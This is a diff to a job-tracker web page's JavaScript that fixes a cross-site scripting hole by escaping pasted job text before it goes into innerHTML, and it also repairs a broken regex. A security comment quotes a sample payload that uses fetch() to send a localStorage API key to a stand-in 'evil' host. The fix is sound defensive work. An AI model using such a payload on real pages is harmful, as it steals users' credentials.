@@ -583,6 +583,17 @@ document.documentElement.classList.add('js');
    NAV: dropdowns + mobile menu
    ================================================================ */
 const $ = (s, c = document) => c.querySelector(s);
+
+// SECURITY FIX (audit 2026-08-04): user-pasted job-posting text is parsed and
+// later interpolated into innerHTML. Without escaping, a crafted paste (e.g.
+// "Organization: <img src=x onerror=fetch('https://evil/?c='+localStorage.getItem('asilva-kimi-key'))>")
+// executes arbitrary script in the page (stored/DOM-based self-XSS), which can
+// read localStorage (API keys) or the tracker data. `escapeHtml()` already
+// existed further down this file but was applied inconsistently (tracker's
+// organization/role were escaped; extractedContent, deadline, and gap fields
+// were not). Hoisted here and applied everywhere job-derived text touches
+// innerHTML — see renderExtracted() and renderTracker() below.
+function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text ?? ''; return div.innerHTML; }
 const $$ = (s, c = document) => [...c.querySelectorAll(s)];
 
 $$('[data-drop] > .drop-btn').forEach(btn => {
@@ -915,10 +926,12 @@ function renderExtracted(job) {
     { label: 'Deadline', value: job.deadline || '—' },
     { label: 'Experience Required', value: job.requiredYears > 0 ? job.requiredYears + '+ years' : '—' }
   ];
+  // SECURITY FIX: f.value is derived from the pasted job posting (untrusted
+  // input) — escape before interpolating into innerHTML.
   $('#extractedContent').innerHTML = fields.map(f => `
     <div style="padding:.8rem;border-radius:10px;background:var(--pill-bg);border:1px solid var(--line)">
-      <div style="font-family:var(--font-cond);font-size:.68rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--text-3);margin-bottom:.25rem">${f.label}</div>
-      <div style="font-weight:600;color:var(--text);font-size:.95rem">${f.value}</div>
+      <div style="font-family:var(--font-cond);font-size:.68rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--text-3);margin-bottom:.25rem">${escapeHtml(f.label)}</div>
+      <div style="font-weight:600;color:var(--text);font-size:.95rem">${escapeHtml(f.value)}</div>
     </div>
   `).join('');
 }
@@ -986,7 +999,7 @@ function renderTracker() {
             <td><strong>${escapeHtml(item.organization)}</strong></td>
             <td>${escapeHtml(item.role)}</td>
             <td><span class="tracker-score ${item.score >= 80 ? 'high' : item.score >= 50 ? 'medium' : 'low'}">${item.score}</span></td>
-            <td>${item.deadline || '—'}</td>
+            <td>${escapeHtml(item.deadline) || '—'}</td>
             <td><select class="tracker-status" onchange="updateStatus(${item.id}, this.value)">${statuses.map(s => `<option value="${s}" ${item.status === s ? 'selected' : ''}>${s}</option>`).join('')}</select></td>
             <td>${item.dateAdded}</td>
             <td><div class="tracker-actions"><button onclick="deleteItem(${item.id})" title="Delete" aria-label="Delete">🗑</button></div></td>
@@ -996,8 +1009,6 @@ function renderTracker() {
     </table>
   `;
 }
-
-function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
 window.updateStatus = function(id, status) { const items = getTracker(); const item = items.find(i => i.id === id); if (item) { item.status = status; saveTracker(items); } };
 window.deleteItem = function(id) { if (!confirm('Delete this opportunity?')) return; saveTracker(getTracker().filter(i => i.id !== id)); };
 
@@ -1057,10 +1068,7 @@ async function fetchFromUrl() {
     if (!extractedText && doc.body) extractedText = doc.body.textContent;
 
     // Clean up
-    extractedText = extractedText.replace(/\s+/g, ' ').replace(/
-\s*
-/g, '
-').trim();
+    extractedText = extractedText.replace(/\s+/g, ' ').replace(/\n\s*\n/g, '\n').trim();
 
     if (extractedText.length < 100) {
       statusEl.textContent = 'Fetched the page but could not extract job text. The content may load dynamically via JavaScript, or the page structure is unrecognized. Please paste the job text manually below.';
